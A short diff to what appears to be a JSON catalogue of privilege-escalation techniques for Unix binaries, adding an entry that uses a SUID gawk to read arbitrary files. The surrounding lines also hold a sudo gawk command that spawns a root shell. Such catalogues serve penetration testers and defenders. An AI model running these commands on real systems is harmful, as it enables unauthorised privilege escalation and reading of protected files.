@@ -27,6 +27,11 @@
         "code": "gawk '//' [file]\n"
       }
     ],
+      "suid": [
+      {
+        "code": "./gawk '//' \"[file]\""
+      }
+    ],
     "sudo": [
       {
         "code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
